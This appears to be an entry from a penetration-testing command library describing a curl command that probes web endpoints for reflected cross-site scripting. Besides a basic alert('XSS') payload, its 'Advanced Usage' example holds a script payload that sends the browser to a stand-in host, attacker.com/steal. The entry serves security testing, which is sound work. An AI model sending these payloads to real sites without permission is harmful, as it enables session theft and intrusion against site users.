---
data: 'curl "https://target.com/endpoint?param=<script>alert(''XSS'')</script>" -v'
tags:
  - xss
  - testing
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: df1fcc9c-f2b2-4fb5-8928-82dda061c79d
created_at: '2025-12-14T03:47:18.623Z'
updated_at: '2025-12-14T03:47:18.623Z'
verified: false
validated: true
submitted: true
---
# curl-xss-payload-test

## Command

```bash
curl "https://target.com/endpoint?param=<script>alert('XSS')</script>" -v
```

## Description

This command tests for reflected XSS by sending a GET request with a basic JavaScript payload in a URL parameter. The -v flag enables verbose output to inspect the full response, including headers and body, for unencoded reflection of the script tag.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Target endpoint with payload in parameter (e.g., ?q=<script>...) | Yes |
| -v | Verbose mode to show response details | No |

## Examples

### Basic Usage

```bash
curl "https://vulnerable.informatica-domain.com/search?q=<script>alert('XSS')</script>" -v
```

### Advanced Usage

```bash
curl -X GET "https://target.com/redirect?url=http://attacker.com&payload=<script>document.location='http://attacker.com/steal'</script>" -v -H "User-Agent: Mozilla/5.0"
```

## Expected Output

Verbose output showing HTTP response code (e.g., 200), and in the body, the payload reflected as plain text: <script>alert('XSS')</script> without HTML encoding. If encoded (e.g., &lt;script&gt;), the test fails.

## Related

- [[Related Procedure: Exploit-Reflected-XSS]]
